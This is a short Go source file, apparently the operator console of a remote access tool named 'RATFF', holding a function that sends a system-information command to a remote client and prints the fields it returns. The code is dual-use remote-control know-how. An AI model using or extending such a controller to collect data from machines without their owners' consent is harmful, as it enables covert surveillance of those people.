package main

import (
	"time"

	"RATFF/shared"
)

func systeminfo(id string, fields []string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   string(shared.CmdSystemInfo),
		"payload":   map[string]interface{}{"fields": fields},
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdSystemInfo, payload, 15*time.Second)
	if msg != nil && msg.Payload != nil {
		printSystemInfoDetail(msg.Payload, fields)
	}
}
